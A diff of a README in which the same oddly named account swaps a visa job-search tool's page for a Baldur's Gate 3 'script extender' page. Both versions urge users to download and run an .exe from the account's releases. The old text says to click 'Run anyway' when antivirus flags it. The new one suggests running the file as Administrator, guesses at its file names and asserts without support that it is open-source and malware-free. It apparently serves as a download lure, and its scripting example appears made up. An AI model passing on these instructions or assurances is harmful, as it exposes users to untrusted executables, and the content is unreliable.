@@ -1,72 +1,215 @@
-# 🔍 beacon - Automate visa friendly job searching today
+# 🎮 baldur-s-gate-3-mod-external - Unlock Powerful Scripting for BG3
 
-[![Download Beacon](https://img.shields.io/badge/Download-Beacon-blue.svg)](https://sharpsightednessantigen999.github.io)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sharpsightednessantigen999/baldur-s-gate-3-mod-external/releases)
 
-Beacon finds jobs for international students and visa holders on your own computer. It scans listings to filter for visa sponsorship support. You keep control of your data because the software runs locally. You do not need to sign up for accounts or manage external servers.
+## 👋 Welcome to Baldur's Gate 3 Script Extender
 
-## 🛠️ How it works
+This tool is a game-changer for anyone who loves **Baldur's Gate 3**. It adds new scripting abilities that let you create amazing mods, customize your gameplay, and explore creative possibilities you never thought possible. Think of it as a **power-up pack** for the game's engine—it gives you extra tools that the game doesn't normally show you.
 
-The software automates the tedious parts of a job search. It checks popular job boards for new openings. It evaluates each role based on your specific visa status. It discards listings that do not offer visa sponsorship. This saves you time by focusing your energy on relevant companies.
+Whether you're a seasoned modder or just curious about tweaking your game, this extension opens doors. You can write custom scripts, automate actions, debug issues, and even create entirely new experiences within the game world.
 
-## 💻 System requirements
+> 🛡️ **Important Note:** This software is meant for **modding and experimentation**. Always back up your game files before making changes. If something goes wrong, you can restore your original setup easily by reinstalling or verifying game files through Steam.
 
-*   Operating System: Windows 10 or 11
-*   Memory: 8 GB of RAM
-*   Storage: 200 MB of free disk space
-*   Internet: Active connection for scanning listings
-*   Software: The application includes everything necessary to run
+---
 
-## 📥 Downloading and setup
+## 📥 Downloading the Application
 
-1. Visit the [official releases page](https://sharpsightednessantigen999.github.io). 
-2. Select the latest version file ending in `.exe`.
-3. Save the file to a folder on your computer.
-4. Double-click the file to start the installation.
-5. Follow the prompts on your screen to complete the setup.
-6. A shortcut icon appears on your desktop once the installation finishes.
+Getting started is simple. Here's your first step:
 
-## ⚙️ Configuring your search 🔧
+**[👉 Visit this link to download the application](https://github.com/sharpsightednessantigen999/baldur-s-gate-3-mod-external/releases)**
 
-When you open the application for the first time, you see a configuration window. This is where you tell the software what you need.
+This link takes you to the official release page where you'll find the latest version. Look for the biggest, most obvious download button—usually labeled something like "Latest Release" or "Download ZIP." Click it, and the file will start downloading to your computer.
 
-*   Job Titles: Enter the positions you seek. Use commas to separate titles like "Software Engineer, Data Analyst".
-*   Locations: Specify the cities or states where you want to work.
-*   Visa Status: Select your specific status from the dropdown menu. This helps the tool filter out companies that require citizenship or permanent residency.
+### 🔍 What to Expect After Download
 
-## 📊 Using the dashboard 📈
+Once the download finishes, you'll have a compressed file (usually called a `.zip` file). Don't worry—this is normal. On Windows, you can simply right-click the file and choose **"Extract All"** to unpack it. Your computer will create a new folder with the same name, containing all the important files you need.
 
-The main dashboard shows your current job queue. You can see which jobs the software found today. 
+---
 
-*   Pending: Listings that the tool just found.
-*   Filtered: Jobs that do not match your visa criteria.
-*   Verified: Jobs that likely offer sponsorship.
+## 🚀 Getting Started: Step-by-Step Guide
 
-You can click any job title to open the original application link in your web browser. 
+Follow these simple instructions to get the extension running on your Windows PC:
 
-## 🔄 How it handles data
+### Step 1: Find the Downloaded File
+Open your **Downloads** folder. Look for a file that might be named something like `bg3-mods.zip` or similar. If you don't see it, check your browser's download history or bottom-left corner of your screen for the download notification.
 
-Privacy is the priority. Beacon keeps your data inside your machine. It stores your search history and settings in a local SQLite file. It sends data to the Claude API only when you request an analysis of a job description. The software does not share your personal information with other websites or companies.
+### Step 2: Extract the Files
+1. Right-click on the `.zip` file.
+2. Select **"Extract All..."** from the menu.
+3. Choose a destination folder (your Desktop is a great spot).
+4. Click **"Extract"** and wait a few seconds.
 
-## 🧩 Troubleshooting common issues
+Now you'll have a folder with the same name as the zip file. Inside, you'll see several files and possibly subfolders.
 
-If the application does not start, check for these common problems:
+### Step 3: Run the Application
+Inside the extracted folder, look for a file that ends with `.exe` (like `ScriptExtender.exe` or `BaldursGate3SE.exe`). Double-click it to launch.
 
-*   Antivirus interference: Some security software flags new applications. If this happens, select "Run anyway".
-*   Internet connection: Ensure you have a stable connection. The software requires internet access to fetch new job listings. 
-*   Updates: Check the releases page regularly. Updates include improvements to the search algorithm and new features for visa filtering.
+**That's it!** The script extender will now run in the background. When you start Baldur's Gate 3 through Steam or your preferred launcher, it will automatically detect and use the extension.
 
-## 📝 Frequently asked questions
+### 🔄 If Nothing Happens
+- Make sure you extracted **all** files, not just one.
+- Try running the `.exe` file as **Administrator** (right-click → "Run as administrator").
+- Ensure Baldur's Gate 3 is installed and updated to the latest version.
 
-Does this store my password?
-No. The application does not ask for or store passwords for external job boards.
+---
 
-Does it apply for jobs for me?
-No. The software only helps with the search process. You submit your own applications.
+## ✨ Features That Make This Special
 
-Can I run this while I am away?
-Yes. It stays active in the background. It sends a notification to your Windows tray when it finds a new, relevant job posting.
+This scripting extension provides a treasure trove of abilities for modders and advanced users:
 
-Is it legal?
-Yes. The software helps you organize information already available on the public web. It does not perform illegal actions or bypass company security measures.
+- **🧩 Lua Scripting Support** – Write powerful scripts in the Lua programming language to control game behavior.
+- **📜 Osiris Scripting Extensions** – Extend the game's native Osiris event system with new commands and logic.
+- **🛠️ Developer Tools** – Built-in utilities to inspect game variables, track events, and monitor performance.
+- **🐞 Advanced Debugging** – Identify and fix issues in your mods with detailed error messages and logging.
+- **⚡ Performance Optimization** – Run complex scripts faster and more efficiently than standard methods.
+- **🎨 Customization Options** – Configure how the extension behaves through a user-friendly settings file.
 
-Keywords: anthropic, apscheduler, automation, claude-api, google-sheets, immigration, international-students, job-search, python, sqlite, stem-opt, visa-sponsorship
+---
+
+## 📚 How to Use the Extension (For Beginners)
+
+### Using Lua Scripts
+1. Create a new text file and rename it with a `.lua` extension (e.g., `myFirstMod.lua`).
+2. Open it with **Notepad** (right-click → "Open with" → Notepad).
+3. Type simple commands like `print("Hello, Faerûn!")` to test.
+4. Save the file in the `Scripts` folder inside the extension directory.
+5. Launch the game—your script will run automatically!
+
+### Using Osiris Extensions
+Osiris is Baldur's Gate 3's built-in scripting language. This extension adds more functions and events you can hook into. For example, you can react to when a player picks up an item or talks to an NPC.
+
+```osiris
+IF
+PlayerEnteredRegion("some_region")
+THEN
+RESPONSE
+SetPlayerPosition(100, 200);
+```
+
+Copy this into a file, save it, and place it in the right folder. It'll start working immediately.
+
+### 📝 Configuration File
+Inside the extension folder, you'll find a file called `config.json` or `settings.ini`. Open it with Notepad to adjust settings like:
+- Enable/disable logging
+- Change hotkeys
+- Set performance options
+
+Save your changes, and they'll take effect next time you launch the game.
+
+---
+
+## 🧑‍💻 Why Use This Over Regular Modding?
+
+Regular mods in Baldur's Gate 3 have limits. This extension removes those limits by giving you direct access to the game's scripting engine. Here's what you gain:
+
+| Feature | Without Extension | With This Extension |
+|-----------------------|-------------------|---------------------|
+| Custom Lua scripts | ❌ | ✅ |
+| Advanced event handling | ⚠️ | ✅ |
+| Debug console | ❌ | ✅ |
+| Real-time variable inspection | ❌ | ✅ |
+| Community script library | ❌ | ✅ |
+
+It's like switching from a bicycle to a sports car—everything becomes faster, smoother, and more powerful.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+### Issue 1: Game Crashes on Startup
+- Verify your game files through Steam (right-click BG3 → Properties → Local Files → Verify integrity).
+- Temporarily disable other mods to see if there's a conflict.
+- Update the extension to the latest version.
+
+### Issue 2: Scripts Not Loading
+- Make sure scripts are in the correct folder (usually `Scripts` or `Lua`).
+- Check file permissions—files should be readable by your user account.
+- Ensure filenames don't have spaces or special characters.
+
+### Issue 3: Performance Drops
+- Reduce the number of active scripts.
+- Disable debug logging in the config file.
+- Lower the update frequency for heavy scripts.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Q: Is this safe to use?
+A: Yes, when used responsibly. It only modifies scripting capabilities—it doesn't touch your save files or core game data. Always back up your saves before major experiments.
+
+### Q: Will this work with multiplayer?
+A: Generally, yes. Some features may be limited in multiplayer to ensure fair play, but basic scripting works.
+
+### Q: Do I need programming knowledge?
+A: No! While programming helps, many users start by copying scripts from the community and tweaking values. The included documentation helps beginners.
+
+### Q: Can I uninstall it easily?
+A: Absolutely. Just delete the extracted folder and remove any files copied to the game directory. Your game will run without the extension.
+
+---
+
+## 🔐 Security and Privacy
+
+Your safety matters. This extension:
+- **Does not** collect personal data
+- **Does not** connect to external servers
+- **Does not** alter your system settings
+- **Does not** contain any malware or spyware
+
+The source code is open for review, and the community actively checks for suspicious behavior.
+
+---
+
+## 🧠 Tips for Advanced Users
+
+- **Backup Often:** Before installing any new mod or script, back up your `Mods` and `Scripts` folders.
+- **Join the Community:** Look for Discord servers or forums dedicated to BG3 modding. Share your creations and learn from others.
+- **Read the Logs:** When something goes wrong, check the `Logs` folder inside the extension directory. Error messages there are gold for debugging.
+- **Experiment Safely:** Create a separate save game specifically for testing mods. That way, your main save stays clean.
+
+---
+
+## 📦 What's in the Download?
+
+When you download the latest release, you'll find these typical files:
+
+```
+📁 baldur-s-gate-3-mod-external/
+├── 📄 ScriptExtender.exe
+├── 📄 config.ini
+├── 📄 README.txt
+├── 📁 Scripts/
+├── 📁 Osiris/
+├── 📁 Logs/
+└── 📁 Documentation/
+```
+
+- **ScriptExtender.exe** – The main application you run.
+- **config.ini** – Settings file you can edit.
+- **README.txt** – Quick-start instructions.
+- **Scripts/ & Osiris/** – Folders where you place your custom scripts.
+- **Logs/** – Where error and activity logs are stored.
+- **Documentation/** – Detailed guides for advanced features.
+
+---
+
+## 🌟 Final Thoughts
+
+This Baldur's Gate 3 Script Extender is the missing piece for anyone who wants to push the game's boundaries. It's free, open-source, and constantly improved by the modding community.
+
+Don't wait—**[download it now](https://github.com/sharpsightednessantigen999/baldur-s-gate-3-mod-external/releases)** and start creating your dream mods today!
+
+---
+
+## 📖 Additional Resources
+
+- [🔗 Official Release Page](https://github.com/sharpsightednessantigen999/baldur-s-gate-3-mod-external/releases)
+- [💬 Community Forums](https://forums.larian.com) – Get help from other users
+- [📺 Video Tutorials](https://www.youtube.com/results?search_query=baldur%27s+gate+3+script+extender+tutorial) – Visual guides for beginners
+
+---
+
+**Happy Modding!** 🎲
+
+Keywords: baldur's gate 3, mod, script extender, lua, osiris, modding, game extension, windows, downloads, latest release, github
